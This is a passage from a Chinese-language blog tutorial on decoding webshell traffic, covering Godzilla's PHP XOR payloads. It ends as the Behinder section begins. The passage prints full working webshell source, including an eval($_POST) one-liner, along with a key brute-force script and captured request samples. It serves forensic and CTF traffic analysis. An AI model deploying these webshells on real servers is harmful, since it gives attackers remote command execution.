                        <a href="#%e5%93%a5%e6%96%af%e6%8b%89%e6%b5%81%e9%87%8f" aria-label="哥斯拉流量">哥斯拉流量</a><ul>
                            
                    <li>
                        <a href="#php_xor_base64" aria-label="php_xor_base64">php_xor_base64</a></li>
                    <li>
                        <a href="#php_eval_xor_base64" aria-label="php_eval_xor_base64">php_eval_xor_base64</a></li>
                    <li>
                        <a href="#php_xor_raw" aria-label="php_xor_raw">php_xor_raw</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%86%b0%e8%9d%8e%e6%b5%81%e9%87%8f" aria-label="冰蝎流量">冰蝎流量</a><ul>
                            
                    <li>
                        <a href="#default_xor_base64" aria-label="default_xor_base64">default_xor_base64</a></li>
                    <li>
                        <a href="#aes_with_magic" aria-label="aes_with_magic">aes_with_magic</a></li>
                    <li>
                        <a href="#default_aes" aria-label="default_aes">default_aes</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e4%b8%ad%e5%9b%bd%e8%9a%81%e5%89%91" aria-label="中国蚁剑">中国蚁剑</a></li></ul>
                    </li>
                    <li>
                        <a href="#cobalt-strike%e6%b5%81%e9%87%8f" aria-label="Cobalt Strike流量">Cobalt Strike流量</a><ul>
                            
                    <li>
                        <a href="#http-beacon" aria-label="http-beacon">http-beacon</a></li></ul>
                    </li>
                    <li>
                        <a href="#smb2" aria-label="SMB2">SMB2</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="tshark的使用">tshark的使用<a hidden class="anchor" aria-hidden="true" href="#tshark的使用">#</a></h2>
<h2 id="webshell流量">webshell流量<a hidden class="anchor" aria-hidden="true" href="#webshell流量">#</a></h2>
<h3 id="哥斯拉流量">哥斯拉流量<a hidden class="anchor" aria-hidden="true" href="#哥斯拉流量">#</a></h3>
<p><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
<p>分析版本：Godzilla 4.01</p>
<p>基本配置界面：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.png"></p>
<p>Password：请求参数名</p>
<p>Key：计算密钥的md5值，然后取其前16位用于加密过程</p>
<p>请求配置界面：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.png"></p>
<p>自定义header以及在请求时添加干扰数据</p>
<p>在 <code>Manage -&gt; GenerateShell</code> 中生成webshell：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.png"></p>
<p>4种payload：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.png"></p>
<p>每种payload都可以选择不同的Encryptor，分析部分以PhpDynamicPayload为例</p>
<h4 id="php_xor_base64">php_xor_base64<a hidden class="anchor" aria-hidden="true" href="#php_xor_base64">#</a></h4>
<p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>($D,$K){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($D);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $K[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>        $D[$i] <span style="color:#f92672">=</span> $D[$i]<span style="color:#f92672">^</span>$c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $D;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pass&#39;</span>;
</span></span><span style="display:flex;"><span>$payloadName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;payload&#39;</span>;
</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3c6e0b8a9c15224a&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[$pass])){
</span></span><span style="display:flex;"><span>    $data<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">base64_decode</span>($_POST[$pass]),$key);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[$payloadName])){
</span></span><span style="display:flex;"><span>        $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($_SESSION[$payloadName],$key);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($payload,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">===</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>            $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($payload,$key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">eval</span>($payload);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">run</span>($data),$key));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($data,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>            $_SESSION[$payloadName]<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($data,$key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>上传到目标url下后续通过Target即可连上webshell</p>
<p>尝试执行<code>whoami</code>并用wireshark抓取流量进行分析：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/5.png"></p>
<p>请求包：</p>
<pre tabindex="0"><code>pass=fL1tMGI4YTljzn78f8Wo%2FyhTl1UCWCn3LmDlfWRkKzUxH296TG6bt%2B2%2F%2BxNczoCdLcxgKWf5RJxKpMRUFBQXAvtrNaTNJ38nzW6naG6Wzpc1qPSv%2BqPInQNVklSqrzuh8qmHp%2Fqjq%2F1uBQ6HEAG4ClwBUgFNPWFjapfQQTI0YQ%3D%3D
</code></pre><p>响应包：</p>
<pre tabindex="0"><code>11cd6a8758984163fL1tMGI4YTljO357H/pP+kzmKPpWiVHzUL/8e///TviE02cwwBczo3sxNTI=6c37ac826a2a04bc
</code></pre><p>可以发现请求包中是可以获取到密码配置信息的：<code>pass</code></p>
<p>所以即使题目流量里没有给出上传的webshell，也可以通过爆破来获取密钥，原因在于响应包中是输出了拼接pass和key后的md5信息的：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>);  <span style="color:#75715e">// 前16位，本例中为 11cd6a8758984163
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">run</span>($data),$key));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">16</span>);  <span style="color:#75715e">// 后16位，本例中为 6c37ac826a2a04bc
</span></span></span></code></pre></div><p>真正的执行结果为：</p>
<pre tabindex="0"><code>fL1tMGI4YTljO357H/pP+kzmKPpWiVHzUL/8e///TviE02cwwBczo3sxNTI=
</code></pre><p>验证：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/6.png"></p>
<p>爆破脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">md5_encode</span>(text):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hashlib<span style="color:#f92672">.</span>md5(text<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_key</span>(key, pass_key_hash):
</span></span><span style="display:flex;"><span>    Pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pass&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> key:
</span></span><span style="display:flex;"><span>        key_hash_16 <span style="color:#f92672">=</span> md5_encode(k)[:<span style="color:#ae81ff">16</span>] <span style="color:#75715e"># 密钥的md5前16位</span>
</span></span><span style="display:flex;"><span>        hash <span style="color:#f92672">=</span> md5_encode(Pass <span style="color:#f92672">+</span> key_hash_16)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pass_key_hash <span style="color:#f92672">==</span> hash:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;爆破密钥成功&#34;</span>)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;密钥: </span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;密钥md5前16位为 </span><span style="color:#e6db74">{</span>key_hash_16<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> k
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;密钥爆破失败&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    hash_0_16 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;11cd6a8758984163&#34;</span>
</span></span><span style="display:flex;"><span>    hash_16_32 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;6c37ac826a2a04bc&#34;</span>
</span></span><span style="display:flex;"><span>    pass_key_hash <span style="color:#f92672">=</span> hash_0_16 <span style="color:#f92672">+</span> hash_16_32
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 设置key 爆破字典</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;dict.txt&#34;</span>,<span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    crack_key(key, pass_key_hash)
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/7.png"></p>
<p>根据webshell中的encode逻辑，可以看出只是一个 <code>xor + base64</code> 操作，run函数里面才是真正执行命令的部分，要获取run函数只要修改一下原本的webshell，输出 <code>$payload</code> 即可，里面提到gzip编码输出以及解码输入：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>($pms){
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... (其他代码)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// *** Gzip 解码输入数据 ***
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">canCallGzipDecode</span>()<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;&amp;@</span><span style="color:#a6e22e">isGzipStream</span>($pms)){
</span></span><span style="display:flex;"><span>        $pms<span style="color:#f92672">=</span><span style="color:#a6e22e">gzdecode</span>($pms); <span style="color:#75715e">// 这里是关键点之一：对传入参数 $pms 进行 gzdecode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">formatParameter</span>($pms);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... (执行代码)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    $result<span style="color:#f92672">=@</span><span style="color:#a6e22e">evalFunc</span>(); <span style="color:#75715e">// 获取执行结果
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... (处理 Session 和错误)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// *** Gzip 编码输出结果 ***
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($_SES<span style="color:#f92672">!==</span><span style="color:#66d9ef">null</span>){ <span style="color:#75715e">/* ... session save ... */</span> }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">canCallGzipEncode</span>()){
</span></span><span style="display:flex;"><span>        $result<span style="color:#f92672">=</span><span style="color:#a6e22e">gzencode</span>($result,<span style="color:#ae81ff">6</span>); <span style="color:#75715e">// 这里的关键点之二：对输出结果 $result 进行 gzencode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>直接用cyberchef就可以解出命令和执行结果，还要注意根据encode逻辑异或得从key的第二个字符开始：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/8.png"></p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/9.png"></p>
<h4 id="php_eval_xor_base64">php_eval_xor_base64<a hidden class="anchor" aria-hidden="true" href="#php_eval_xor_base64">#</a></h4>
<p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#34;pass&#34;</span>]);
</span></span></code></pre></div><p>流量包：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/10.png"></p>
<p>执行的代码：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>($D,$K){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($D);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $K[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>        $D[$i] <span style="color:#f92672">=</span> $D[$i]<span style="color:#f92672">^</span>$c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $D;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;key&#39;</span>;
</span></span><span style="display:flex;"><span>$payloadName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;payload&#39;</span>;
</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3c6e0b8a9c15224a&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[$pass])){
</span></span><span style="display:flex;"><span>    $data<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">base64_decode</span>($_POST[$pass]),$key);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[$payloadName])){
</span></span><span style="display:flex;"><span>        $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($_SESSION[$payloadName],$key);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($payload,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">===</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>            $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($payload,$key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">eval</span>($payload);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">run</span>($data),$key));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($pass<span style="color:#f92672">.</span>$key),<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($data,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>            $_SESSION[$payloadName]<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($data,$key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这里的pass变成了key：</p>
<pre tabindex="0"><code>key=fL1tMGI4YTljzn78f8Wo%2FyhTl1UCWCn3LmDlfWRkKzUxH296TG6bt%2B2%2F%2BxNczoCdLcxgKWf5RJxKpMRUFBQXAvtrNaTNJ38nzW6naG6Wzpc1qPSv%2BqPInQNVklSqrzuh8qmHp%2Fqjq%2F1uBQ6HEAG4ClwBUgFNPWFjapfQQTI0YQ%3D%3D
</code></pre><p>执行的命令：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12.png"></p>
<p>执行结果：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/13.png"></p>
<h4 id="php_xor_raw">php_xor_raw<a hidden class="anchor" aria-hidden="true" href="#php_xor_raw">#</a></h4>
<p>本质上都是xor，与 php_xor_base64 的区别是没有进行base64编码，从流量中导出参数时需要设置为raw，cyberchef解密时加一层 <code>from hex</code></p>
<p>webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>($D,$K){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($D);$i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $K[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>        $D[$i] <span style="color:#f92672">=</span> $D[$i]<span style="color:#f92672">^</span>$c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $D;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$payloadName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;payload&#39;</span>;
</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3c6e0b8a9c15224a&#39;</span>;
</span></span><span style="display:flex;"><span>$data<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($data<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>    $data<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($data,$key);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[$payloadName])){
</span></span><span style="display:flex;"><span>        $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($_SESSION[$payloadName],$key);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($payload,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">===</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>            $payload<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($payload,$key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">eval</span>($payload);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">encode</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">run</span>($data),$key);
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($data,<span style="color:#e6db74">&#34;getBasicsInfo&#34;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>            $_SESSION[$payloadName]<span style="color:#f92672">=</span><span style="color:#a6e22e">encode</span>($data,$key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>流量包：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14.png"></p>
<p>ASCII -&gt; Raw：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15.png"></p>
<p>执行的命令：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16.png"></p>
<p>执行结果：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17.png"></p>
<h3 id="冰蝎流量">冰蝎流量<a hidden class="anchor" aria-hidden="true" href="#冰蝎流量">#</a></h3>
<p><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
<p>分析版本：Behinder 4.1</p>
<p>配置界面：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18.png"></p>
